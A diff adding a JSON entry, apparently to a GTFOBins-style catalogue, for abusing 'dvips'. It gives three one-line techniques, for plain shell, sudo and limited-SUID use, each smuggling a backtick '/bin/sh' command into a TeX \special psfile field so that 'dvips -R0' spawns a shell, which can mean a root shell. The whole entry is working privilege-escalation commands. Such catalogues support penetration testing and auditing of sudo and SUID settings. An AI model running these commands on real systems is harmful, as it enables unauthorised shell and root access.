@@ -1,0 +1,20 @@
+{
+  "description": "The 'texput.dvi' output file produced by 'tex' can be created offline and uploaded to the target.",
+  "functions": {
+    "shell": [
+      {
+        "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n"
+      }
+    ]
+  }
+}
